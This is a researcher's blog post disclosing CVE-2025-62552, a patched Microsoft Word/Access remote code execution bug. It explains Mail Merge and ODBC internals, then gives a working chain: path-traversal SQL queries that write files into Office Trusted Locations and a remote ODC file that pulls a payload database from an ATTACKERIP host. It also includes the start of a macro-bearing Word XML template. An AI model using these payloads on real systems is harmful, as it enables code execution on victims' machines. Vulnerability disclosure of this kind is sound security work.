---
layout:     post
title:      "Breakdown of Microsoft Access RCE - CVE-2025-62552"
subtitle:   "From the not so known Mail Merge feature to RCE via ODBC Path Traversal"
date:       2025-12-26 21:00:00
author:     "ErPaciocco"
header-img: "/images/posts/2025-12-26-from-mailmerge-to-rce/CVE-MSRC.png"
categories: Windows
toc:        true
color:      blue
---

Hello guys! I am here to break down **CVE-2025-62552**, a vulnerability I discovered and reported on August, after countless days spent striving on a way to find an RCE on Microsoft Office. Now I can confidently say *I hit the spot*! This vulnerability has been addressed on 9th December 2025 during Microsoft Patch Tuesday, with a CVSS 3.1 score of 7.8. I only received a few points, but I honestly think it deserves more than that! So, let's start...

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/Versioni-Word-fixate.png %}"
         alt="Fixed Word Version">
    <figcaption>Fixed Word Version</figcaption>
</figure>

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/Versione-Word-vulnerabile.png %}"
         alt="Vulnerable Word Version">
    <figcaption>Vulnerable Word Version</figcaption>
</figure>

---

{% toc %}

### Part 1: exploring Word features
After an initial overview of main Word features, I was wondering what would have been its least "inspected" features, to focus my energies on what could possibly lead, with more probabilities, to 0days. I also decided to focus on *application logic bugs* rather than memory corruption ones. Here are my initial considerations:
- **Alternative Format Chunks**: it's a quite interesting and unknown feature, so it could be a valid choice. But, during past 3 months, I tried to inject almost everything inside its subdocuments, with no notable results! If you want me to dive deeper and explain what my attempts have been and what I've learned so far, please "ping me".
- **OLE Objects**: one of the most exploited features in these years, I have no fear to admit that it would become a very time-expensive goal if I chose to focus on that, seeing that OLE objects and in general COM ecosystem is well-known to the majority of attackers. But, suprise! I even analyzed them for a few days, and...same conclusion, if you want me to explain all my analysis, please reach out to me.
- **Macro & Template documents**: no words needed...
- **XML Mappings**: another interesting yet no popular feature, it's useless to say that I immediately tried an XXE, but no success, because XML Mappings rely on COM MSXML6.0, which by default denies External Entities. SPOILER: do you know that it's possible to trigger an RCE via XSLT Injection through Access? It obviously raises a warning message, but...it is worth a try!
- **MailMerge**: at the time of "exploiting", it was the only feature I hadn't inspected yet, so...why not burning my neurons understanding its mysteries?!

---

### Part 2: exploring MailMerge
So we are slowly reaching the core of this blog post, the hanging fruit you really want to know if you followed my posts on Linkedin! Let's disclose this vulnerability once and for all.

#### What is Mail Merge?
Word **Mail Merge** feature allows you, generally speaking, to create a *seemingly personalized message to everyone (better known as recipients) it's sent to*. This is achieved by inserting "placeholders" inside a document, that, in conjunction with a data source (for example an Excel spreadsheet), will be replaced with each field of the aforementioned sheet. Roughly writing, it's like sending emails based on this example Word template:

`Dear [FirstName], your order [OrderID] has been shipped.`

and replacing `FirstName` and `OrderID` with each correspondent field of an example *Excel CSV* like this:

{% highlight csv %}
FirstName;OrderID;
Peter;1;
John;2;
{% endhighlight %}

Let's break down its inner workings!

#### Inside Mail Merge - Consumers, Drivers/Providers & Data Sources
**Mail Merge** functionality is the end product of 4 different entities:
- **Consumers**: they're the *applications which effectively request data from a data source*. Technically speaking, they're the part of an application codebase that access data over OLEDB/ODBC interfaces.
- **Data Sources**: they're *durable data sources* which store data in a "permanent" way. Practical examples of these are Access Databases, MySQL Databases, Excel Spreadsheets and so on.
- **Providers**: they're the *bridge* between Consumers and Data sources. They make API calls to Data Sources independent from their underlying technology. We can query various kind of Data Sources, whether they are text files, SQL DBs, Access DBs or Excel Spreadsheets, in a standard and unique way.
- **Drivers**: they're often used as a Provider synonym, but in fact *Providers are "ODBC successors", as they are part of the COM ecosystem and provide database handling over multiple data sources, even non-SQL data sources*. It's also common to have Providers which call on their behalf ODBC Drivers. *Providers offer tracing capabilities, along with asynchronous handling, retry loop and conditional cancelling*.

| Aspect                   | ODBC                                                    | OLE DB                                                   |    
|:------------------------:|:-------------------------------------------------------:|:--------------------------------------------------------:|
| <b>API Model</b>         | Procedural C functions (`SQLExecDirect`, `SQLBindCol`)  | COM interfaces (`IRowset`, `ICommand`, `IDBInitialize)`​  |
| <b>Architecture</b>      | Driver Manager + individual drivers (.dll)              | Stand‑alone data provider (.dll) loaded directly         |
| <b>Data Target Types</b> | Relational SQL databases only                           | Relational and non‑relational (files, Excel, XML, etc.) ​ |
| <b>Platform</b>          | Cross‑platform (Windows, Linux, macOS)                  | Windows only (COM‑based)                                 |
| <b>Performance</b>       | Adds a driver‑manager layer                             | Direct COM interfaces → generally faster ​                |
| <b>Transactions</b>      | `SQLTransact`, `SQLEndTran`                             | `ITransaction`, MS DTC enlistment                        |
| <b>Parameter Binding</b> | `SQLBindParameter()`                                    | `ICommandWithParameters`, structured bindings            |
| <b>Cursor Handling</b>   | `SQLFetch`, `SQLFetchScroll`                            | `IRowset::GetNextRows()`                                 |
| <b>Access Provider</b>   | aceodbc.dll (Microsoft Access ODBC driver)              | aceoledb.dll (Microsoft ACE OLE DB)                      |

So general flow is more or less like this picture below:
<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/OLEDB-ODBC-Diagram.png %}"
         alt="Data Source/ODBC/OLEDB/Consumer Diagram">
    <figcaption>Data Source/ODBC/OLEDB/Consumer Diagram - <a>"ADO: ActiveX Data Objects" by Jason T. Roff</a></figcaption>
</figure>

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/OLEDB-Providers.png %}"
         alt="OleDB Main Providers">
    <figcaption>OLEDB Main Providers</figcaption>
</figure>

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/ODBC-Driver-Manager.png %}"
         alt="ODBC Driver Manager">
    <figcaption>ODBC Driver Manager</figcaption>
</figure>

If you want a StackOverflow POV, here it is:
[OLEDB vs ODBC](https://stackoverflow.com/questions/271504/oledb-v-s-odbc/271517#271517).

#### Inside MailMerge - hands-on analysis of .docx MailMerge internals
Now that we have a theoretical knowledge of Mail Merge, let's go with an hands-on analysis of Word document format internals. I have decided to skip basic stuff like how it's stored a Word document (long story short: ZIP file) and to go straight on Mail Merge specific XML tags.
When we choose a Data Source and decide to populate the document with MailMerge placeholders, Microsoft Word automatically adds, inside `/word/settings.xml`, the following tags (obviously tag attributes are dynamically populated):

{% highlight xml %}
<w:mailMerge>
  <w:mainDocumentType w:val="formLetters"/>
  <w:linkToQuery/>
  <w:dataType w:val="DATA TYPE"/>
  <w:connectString w:val="PROVIDER SPECIFIC CONNECTION STRING"/>
  <w:query w:val="SQL QUERY"/>
  <w:dataSource r:id="RELATIONSHIP ID"/>
  <w:odso>
  <!-- OMITTED - NOT NECESSARY -->
  </w:odso> 
</w:mailMerge>
{% endhighlight %}

Let's provide, at this point, an usage example of aforementioned tags:
{% highlight xml %}
<w:mailMerge>
  <w:mainDocumentType w:val="formLetters"/>
  <w:linkToQuery/>
  <w:dataType w:val="native"/>
  <w:connectString w:val="Provider=Microsoft.ACE.OLEDB.12.0;User ID=Admin;Data Source=C:\Temp\test1.accdb;Mode=Read;Extended Properties=&quot;&quot;;Jet OLEDB:System database=&quot;&quot;;Jet OLEDB:Registry Path=&quot;&quot;;Jet OLEDB:Engine Type=6;Jet OLEDB:Database Locking Mode=0;Jet OLEDB:Global Partial Bulk Ops=2;Jet OLEDB:Global Bulk Transactions=1;Jet OLEDB:New Database Password=&quot;&quot;;Jet OLEDB:Create System Database=False;Jet OLEDB:Encrypt Database=False;Jet OLEDB:Don't Copy Locale on Compact=False;Jet OLEDB:Compact Without Replica Repair=False;Jet OLEDB:SFP=False;Jet OLEDB:Support Complex Data=False;Jet OLEDB:Bypass UserInfo Validation=False;Jet OLEDB:Limited DB Caching=False;Jet OLEDB:Bypass ChoiceField Validation=False"/>
  <w:query w:val="SELECT * FROM `Contacts`"/>
  <w:dataSource r:id="rId1"/>
  <w:odso>
  <!-- OMITTED - NOT NECESSARY -->
  </w:odso> 
</w:mailMerge>
{% endhighlight %}

Now, we are going to analyze each tag field and its contextual meaning:
- `w:mainDocumentType`: *document layout type for sending e-mails*, not useful for us.
- `w:linkToQuery`: from MSDN Page, *"Query Contains Link to External Query File"*, though I noticed no meaningful differences.
- `w:dataType`: this is one of the most impactful tags, *it specifies which "algorithm" to use when choosing a Data Source*.
In particular, `native` is the most up to date method to retrieve data from a source. It automatically chooses the best OLEDB provider for each source. `odbc` instead relies on ODBC drivers. There are other possible values of this attributes, as stated by these [OOXML DataType Specifications](https://schemas.liquid-technologies.com/officeopenxml/2006/ct_mailmergedatatype.html), but they've probably been disabled on latest Word versions (they rely on the old DDE, which I explained in my previous posts).
- `w:connectString`: another important tag, which *specifies the connection string based on the method used*.
- `w:query`: *SQL Query to perform on the Data Source*.
- `w:dataSource`: *Relationship ID of the Data Source*, it essentially specifies the path of Data Source.

> <div style="display: table"><div style="display: table-cell; width: 10%; vertical-align: middle; text-align: center; padding-right: 10px"><div class="w-8 h-8 rounded-full" style="background-color: #50c878; font-size: 3.5em"></div> </div><div style="font-weight: 300; width: 90%; display: table-cell; vertical-align: middle; text-align: left;"><span class="rubik" style="font-weight: 300;">When dealing with Mail Merge feature within <i>altChunks</i> it is worth mentioning that keywords are not the same. For example, instead of <code>native</code>, inside <code>&lt;w:MailMergeDataType&gt;</code>, you must use <code>odso</code>. Every Mail Merge tag, as you can see, in HTML embedded inside .docx files, is prepended by <code>MailMerge</code> prefix.</span></div></div>

By the way, you can explore by yourself all the available OOXML MailMerge tags [here](https://schemas.liquid-technologies.com/officeopenxml/2006/?page=ct_mailmerge.html).

Each component we've discussed before is simplified through *Office Data Link* Forms that let you customize almost everything.

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/MailMerge-Wizard-1.png %}"
         alt="Mail Merge Wizard #1">
    <figcaption>Mail Merge Wizard #1</figcaption>
</figure>

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/MailMerge-Wizard-2.png %}"
         alt="Mail Merge Wizard #2">
    <figcaption>Mail Merge Wizard #2</figcaption>
</figure>

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/MailMerge-Wizard-3.png %}"
         alt="Mail Merge Wizard #3">
    <figcaption>Mail Merge Wizard #3</figcaption>
</figure>

With this bunch of theory in mind, we can investigate **SQL queries**, or, at least, what I thought could have possibly lead to a vulnerability, seeing that SQL dialect is very...versatile.

#### Inside MailMerge - let's build some queries
During my analysis, I decided to investigate ODBC technology and its SQL dialect, seeing that it's the oldest technology in place, in order to find some interesting caveats: I thought "It's Windows, it will surely have some niche features!". In particular, I chose to test them on Excel, which has a more verbose UX for Data Source errors.

I started off with *trial-and-error* methodology, trying to produce an unexpected and hopefully exploitable behavior.
Among things I've tested, one behavior caught me: *when I specified a non-existent database inside (ODBC Excel Driver) connection string, file got created!*. This was interesting because we achieved a **"partial" arbitrary write** within the filesystem.

This vulnerability alone couldn't lead me to an RCE, though I immediately thought to abuse it by placing the Excel file inside the *Office StartUp* Trusted Location.
A few things were missing, but, slowly, my "evil" plan was taking shape! I needed two things in order to achieve RCE:
- A fully arbitrary write to place malicious file inside a Trusted Location
- A fully arbitrary read to gather file data from
At that time I only had partial arbitrary write and almost no control over location. So, firstly I needed to find a way to fully control the Excel file I was creating.

> <div style="display: table"><div style="display: table-cell; width: 10%; vertical-align: middle; text-align: center; padding-right: 10px"><div class="w-8 h-8 rounded-full" style="background-color: #50c878; font-size: 3.5em"></div> </div><div style="font-weight: 300; width: 90%; display: table-cell; vertical-align: middle; text-align: left;"><span class="rubik" style="font-weight: 300;"><b>Trusted Locations</b> are special directories in which traditional Office protections are not applied, so you would automatically execute macro if you were able to place a malicious file in this area.</span></div></div>

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/Arbitrary-Write-1.png %}"
         alt="Connection String that triggers the arbitrary file creation">
    <figcaption>Connection String that triggers the arbitrary file creation</figcaption>
</figure>

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/Arbitrary-Write-2.png %}"
         alt="Error Message that shows us that file effectively gets created">
    <figcaption>Error Message that shows us that file effectively gets created</figcaption>
</figure>

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/Arbitrary-Write-3.png %}"
         alt="XLSB File just created - now it's useless">
    <figcaption>XLSB File just created - now it's useless</figcaption>
</figure>

### Part 3: exploiting ODBC SQL Features

Apart from classical SQL queries, which you all should know well, I found that **ODBC allows to specify an "alternative" Data Source, apart from the one specified through connection string, but INSIDE THE SQL QUERY**. This was a lot interesting for me, because it could possibly increase the attack surface.

So, I came up, after googling and "ChatGPT-ing" a lot, with this particular SQL query:
{% highlight sql %}
SELECT * FROM [Excel 12.0 Xml;Database=arbitraryfile.xlsx].[Contacts];
{% endhighlight %}

This query, in short, **uses Excel ODBC Driver to load arbitraryfile.xlsx file**. If we closely look at *File Creation ProcMon events*, we can observe that file is created inside `C:\Program Files\Microsoft Office\root\Office16\ADDINS\Microsoft Power Query for Excel Integrated\bin`. 

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/Arbitrary-Write-4.png %}"
         alt="CreateFile Event - surprise!">
    <figcaption>CreateFile Event - surprise!</figcaption>
</figure>

In that time an insight sparkled in me: *I could try a Path Traversal* to place the created Excel file inside a special writable path like `C:\Users\Administrator\AppData\Roaming\Microsoft\Excel\XLSTART\` so that it will be opened automatically along with another Excel file. But another thing was missing: I really needed a way to control file content, in order to place a macro.

---

Delving into ODBC Specifications, I found another interesting capability: **ODBC allows to write into a table contents of another table**. By exploiting the previous things I've learned along with this capability, I built this ODBC SQL Query:

{% highlight sql %}
SELECT * INTO [Excel 12.0 Xml;Database=../../../../../../../Users/Administrator/AppData/Roaming/Microsoft/Excel/XLSTART/arbitraryfile.xlsx].[Contacts]
FROM [Excel 12.0 Xml;Database=../../../../../../../Users/Administrator/Desktop/test2.xlsx].[Contacts$];
{% endhighlight %}

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/Excel-File-Populated.png %}"
         alt="Excel File succesfully populated and created in an exploitable directory!">
    <figcaption>Excel File succesfully populated and created in an exploitable directory!</figcaption>
</figure>

Now the last thing misses: how can I insert a macro by leveraging this feature? It surely works with tables and formulas, but this attack vector is very limited, especially after Microsoft disabled DDE and other AUTOEXEC formula features.

But let's review carefully "ODBC Driver Manager": I needed a way to insert directly raw text inside a file, and...there's a ODBC default driver that's called: `Microsoft Access Text Driver (*.txt, *.csv)`. It sounds perfect!

Let's try with another SQL query:

{% highlight sql %}
SELECT * INTO [Text;Database=C:/Users/Administrator/Desktop;FMT=Fixed;ColNameHeader=No;HDR=No;].[arbitraryfile.csv]
FROM [Excel 12.0 Xml;Database=../../../../../../../Users/Administrator/Desktop/test2.xlsx].[Contacts$];
{% endhighlight %}

> <div style="display: table"><div style="display: table-cell; width: 10%; vertical-align: middle; text-align: center; padding-right: 10px"><div class="w-8 h-8 rounded-full" style="background-color: #ffd740; font-size: 3.5em"></div>  </div><div style="font-weight: 300; width: 90%; display: table-cell; vertical-align: middle; text-align: left;"><span class="rubik" style="font-weight: 300;">I decided to skip some "mental steps" to not make a too long blog post, but this exploit required me a lot of mental effort!</span></div></div>

So, here is the result:
<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/CSV-File.png %}"
         alt="CSV File created">
    <figcaption>CSV File created</figcaption>
</figure>

This seems like a good deal, right? With CSV file format, we can insert raw text fetched from another data source.
My plan is almost finished, we achieved both arbitrary write and arbitrary read: it's only matter of achieving a 0click (or 1click) RCE.

Now, skipping all the insight steps, let's piece it all together:
1. I will leverage MailMerge feature to create an ODBC connection inside a Word document
2. ODBC connection will create a file inside an attacker controlled Word Trusted Location
3. To achieve RCE, my Word document will have a Custom Template pointing to my evil template just created 

Now...how can we craft a malicious Word Template by using only writable text? Remind that we are using an ODBC Text Driver, so it can only write...text. But, in this case, another interesting Word file format steps in: `.XML 2003 Word Document Format`, **which can contain macros embedded in XML!**.

So, let's immediately put the pieces together!


### Part 4: fully working exploit
Now, the plan is the following: first of all, **we write into an Excel table the maliciously crafted XML Word document with the evil macro**. Then, **we create another Word document**, that will be the "attack vector" the victim has to open, **with an ODBC connection that will write inside the Word Trusted Location the aforementioned XML Word file** (`C:\Users\Administrator\AppData\Roaming\Microsoft\Templates\`). **The same Word target file will reference the template it has just created as External Template**.

So, long story short, here are the fully functional payloads:<br><br>

SQL QUERY:
{% highlight sql %}
SELECT POC INTO [Text;Database=../AppData/Roaming/Microsoft/Templates;FMT=Fixed;ColNameHeader=No;HDR=No;].[evil.csv] FROM T1;
{% endhighlight %}

CONNECTION STRING:
{% highlight text %}
Provider=MSDASQL.1;Data Source=MS Access Database;Persist Security Info=False;Initial Catalog=C:/Users/Administrator/Desktop/source.accdb
{% endhighlight %}

> <div style="display: table"><div style="display: table-cell; width: 10%; vertical-align: middle; text-align: center; padding-right: 10px"><div class="w-8 h-8 rounded-full" style="background-color: #ffd740; font-size: 3.5em"></div>  </div><div style="font-weight: 300; width: 90%; display: table-cell; vertical-align: middle; text-align: left;"><span class="rubik" style="font-weight: 300;">Why Path Traversal contains only one <code>../</code>? It's because downloaded Word documents are supposed to reside in <code>Downloads</code> directory, which is one level below main user directory: in order to access Templates directory, we only need one <code>../</code>. STEALTHY TECHNIQUE!</span></div></div>

> <div style="display: table"><div style="display: table-cell; width: 10%; vertical-align: middle; text-align: center; padding-right: 10px"><div class="w-8 h-8 rounded-full" style="background-color: #ffd740; font-size: 3.5em"></div>  </div><div style="font-weight: 300; width: 90%; display: table-cell; vertical-align: middle; text-align: left;"><span class="rubik" style="font-weight: 300;">Why am I using OLEDB instead of ODBC? It's because, in this case, OLEDB is a wrapper around ODBC, but...more fine grained and customizable.</span></div></div>

> <div style="display: table"><div style="display: table-cell; width: 10%; vertical-align: middle; text-align: center; padding-right: 10px"><div class="w-8 h-8 rounded-full" style="background-color: #ffd740; font-size: 3.5em"></div>  </div><div style="font-weight: 300; width: 90%; display: table-cell; vertical-align: middle; text-align: left;"><span class="rubik" style="font-weight: 300;"><code>FMT=Fixed;ColNameHeader=No;HDR=No;</code> are needed to not make ODBC prepend/append stuff before our actual data.</span></div></div>

We have almost achieved an RCE! The only thing we need is the "R", so the attack can be performed remotely.
We will leverage three interesting features, two from Office side, the other from Windows side:
- **UNC Paths**: we will include an external resource via SMB
- **ODC: Office Data Connection**: it's a file containing all the connection details
- **ODBC Procedure Calls**: to stay stealth, we will abuse this feature

So here is the general workflow of this fantastic RCE:
- Our target document, the one victim will open, will contain both External Template and an ODBC connection pointing to a remotely hosted ODC file
- This ODC file - which can be retrieved even through WebDAV (by specifying custom port after `@` sign) - will perform an OLEDB connection to another remotely hosted .accdb file which contains the XML Word Exploit File
- Once upon opening the document, it will be raised an information message about the execution of the SQL Query `{CALL Q1}`. In fact it is an Access Query that will perform the actual evil query (the one that creates the evil XML document inside a Trusted Location)
- The victim only has to allow the execution of SQL Query, and...poof! You're OWNED!
<br><br>

REMOTE ODC FILE:
{% highlight xml %}
<html xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns="http://www.w3.org/TR/REC-html40">
<head>
<meta http-equiv=Content-Type content="text/x-ms-odc; charset=utf-8">
<meta name=ProgId content=ODC.Database>
<meta name=SourceType content=OLEDB>
<title>ODC EXPLOIT</title>
<xml id=docprops><o:DocumentProperties
  xmlns:o="urn:schemas-microsoft-com:office:office"
  xmlns="http://www.w3.org/TR/REC-html40">
  <o:Name>ODC EXPLOIT</o:Name>
 </o:DocumentProperties>
</xml><xml id=msodc>
<odc:OfficeDataConnection 
    xmlns:odc="urn:schemas-microsoft-com:office:odc"
    xmlns:x="urn:schemas-microsoft-com:office:excel">
  <odc:Connection odc:Type="OLEDB">
    <odc:ConnectionString>
    Provider=MSDASQL.1;Data Source=MS Access Database;Persist Security Info=False;Initial Catalog=//ATTACKERIP@CUSTOMPORT/EXPLOIT/exploit.accdb;
    </odc:ConnectionString>
    <odc:AlwaysUseConnectionFile/>
    <odc:CommandType>SQL</odc:CommandType>
    <odc:CommandText>{CALL Q1}</odc:CommandText>
  </odc:Connection>
</odc:OfficeDataConnection>
</xml>
<style>
<!--
    .ODCDataSource
    {
    behavior: url(dataconn.htc);
    }
-->
</style>
</head>
</html>
{% endhighlight %}

ACCESS SQL QUERY (Q1 - exploit.accdb):
{% highlight sql %}
SELECT POC INTO [Text;Database=../AppData\Roaming\Microsoft\Templates;FMT=Fixed;ColNameHeader=No;HDR=No;].[evil.csv]
FROM T1;
{% endhighlight %}

EVIL WORD XML DOCUMENT:
{% highlight xml %}
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<w:wordDocument xmlns:aml="http://schemas.microsoft.com/aml/2001/core" xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:cx2="http://schemas.microsoft.com/office/drawing/2015/10/21/chartex" xmlns:cx3="http://schemas.microsoft.com/office/drawing/2016/5/9/chartex" xmlns:cx4="http://schemas.microsoft.com/office/drawing/2016/5/10/chartex" xmlns:cx5="http://schemas.microsoft.com/office/drawing/2016/5/11/chartex" xmlns:cx6="http://schemas.microsoft.com/office/drawing/2016/5/12/chartex" xmlns:cx7="http://schemas.microsoft.com/office/drawing/2016/5/13/chartex" xmlns:cx8="http://schemas.microsoft.com/office/drawing/2016/5/14/chartex" xmlns:cr="http://schemas.microsoft.com/office/comments/2020/reactions" xmlns:dt="uuid:C2F41010-65B3-11d1-A29F-00AA00C14882" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:aink="http://schemas.microsoft.com/office/drawing/2016/ink" xmlns:am3d="http://schemas.microsoft.com/office/drawing/2017/model3d" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:oel="http://schemas.microsoft.com/office/2019/extlst" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml" xmlns:wx="http://schemas.microsoft.com/office/word/2003/auxHint" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wsp="http://schemas.microsoft.com/office/word/2003/wordml/sp2" xmlns:sl="http://schemas.microsoft.com/schemaLibrary/2003/core" w:macrosPresent="yes" w:embeddedObjPresent="no" w:ocxPresent="no" xml:space="preserve"><w:ignoreSubtree w:val="http://schemas.microsoft.com/office/word/2003/wordml/sp2"/><o:DocumentProperties>...
{% endhighlight %}

<figure style="text-align: center; margin-bottom: 10px">
    <img src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/ACCDB-Payload.png %}"
         alt="Evil Payload inside Access table">
    <figcaption>Evil Payload inside Access table</figcaption>
</figure>

> <div style="display: table"><div style="display: table-cell; width: 10%; vertical-align: middle; text-align: center; padding-right: 10px"><div class="w-8 h-8 rounded-full" style="background-color: #50c878; font-size: 3.5em"></div> </div><div style="font-weight: 300; width: 90%; display: table-cell; vertical-align: middle; text-align: left;"><span class="rubik" style="font-weight: 300;">You may notice that, by writing the evil query in Access, it will slightly and automatically modify the query. It's alright! It is supposed to be like this!</span></div></div>

<video width="100%" controls style="margin-bottom: 10px">
  <source src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/DOCX-Video.mp4 %}" type="video/mp4">
Your browser does not support the video tag.
</video>

<video width="100%" controls style="margin-bottom: 10px">
  <source src="{% vite_asset_path images/posts/2025-12-26-from-mailmerge-to-rce/RTF-Video.mp4 %}" type="video/mp4">
Your browser does not support the video tag.
</video>


### Conclusion

This attack chain is so far the best I've ever found, in my opinion. It leverages multiple vulnerabilities and I succesfully obtained Command Execution Remotely, even in a sthealth way, through Word and Access!

If you enjoyed this thorough blog post, please reach out to me, comment or...thumb up!
